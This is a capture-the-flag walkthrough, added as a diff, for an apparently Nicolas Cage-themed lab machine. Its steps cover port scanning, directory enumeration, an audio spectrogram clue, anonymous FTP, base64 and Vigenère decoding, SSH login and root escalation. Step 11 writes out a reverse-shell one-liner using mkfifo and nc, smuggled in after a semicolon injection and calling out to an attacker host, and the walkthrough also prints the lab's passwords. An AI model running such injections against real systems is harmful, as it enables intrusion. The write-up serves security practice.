@@ -1,0 +1,113 @@
+1) used nmap to find open ports 
+found ssh-port22, ftp-port21 and http-port80
+there is a web-parge through port 80
+all links are dead (no redirection)
+- nmap -Pn <ip or url>
+
+******************************************
+
+2) used gobuster to find directory tree
+there are five directories:
+-html: empty
+-images: contains the images og the page
+-contracts: contains an empty file
+-scripts: contains five sample movie-scripts
+-auditions: contains a corrupted .mp3 file
+- gobuster -u <ip or url> -w wordlist.txt dir 
+
+**************************************
+
+3) Analyzed the sample audio in audacity and after changing display to 
+spectogram and rate to 8000Hz found the word: 
+"namelesstwo"
+
+******************************************
+
+4) Connected to the server through the ftp port 21 with the command:
+- ftp
+- open <url or ip> port
+
+and credentials for anonymous ftp:
+username: anonymous
+password: guest
+
+*******************************************
+
+5) Dowloaded dad_tasks from ftp server:
+- get dad_tasks 
+
+*******************************************
+
+6) Decoded dad_tasks file which was encoded base64:
+- base64 --decode encoded_file > decoded_file.txt 
+
+********************************************
+
+7) Decrypted the text using vigenere cipher:
+pass phraze: namelesstwo
+
+encrypted message:
+Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
+Sfw. Kajnmb xsi owuowge
+Faz. Tml fkfr qgseik ag oqeibx
+Eljwx. Xil bqi aiklbywqe
+Rsfv. Zwel vvm imel sumebt lqwdsfk
+Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.
+
+Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
+
+decrypted message:
+Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
+One. Revamp the website
+Two. Put more quotes in script
+Three. Buy bee pesticide
+Four. Help him with acting lessons
+Five. Teach Dad what "information security" is.
+
+In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
+
+**************************************************
+
+8) From the decrypted message we see that the password for the user Weston is:
+Mydadisghostrideraintthatcoolnocausehesonfirejokes
+
+**************************************************
+
+9)Logged in through ssh using:
+username: weston
+password: Mydadisghostrideraintthatcoolnocausehesonfirejokes
+-ssh weston@<ip>
+
+**************************************************
+
+10) Found python script "spread_the_quotes.py" in:
+/opt/.dads_scripts which display messages from .files/.quotes.txt file.
+
+****************************************************
+
+11) Gained reverse shell after injecting the following text in .quotes.txt file:
+- lol;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackbox ip> 9001 >/tmp/f
+
+and started listening for connections on the my attackbox with:
+- rlwrap nc -nlvp 9001
+
+********************************************************
+
+12) Found the user flag in:
+Super_Duper_Checklist.txt
+
+****************************************************
+
+13) In the email_backup folder, in the email_3.txt there was the phrase:
+haiinspsyanileph
+
+By using vigenere cipher with pass phraze face we get:
+cageisnotalegend
+
+*****************************************************
+
+14) By using the decrypted phraze as password we gain root privilege
+- su root
+
+15) By checking the email_backup folder in the /root directory
+we found two emails the second email had the last flag
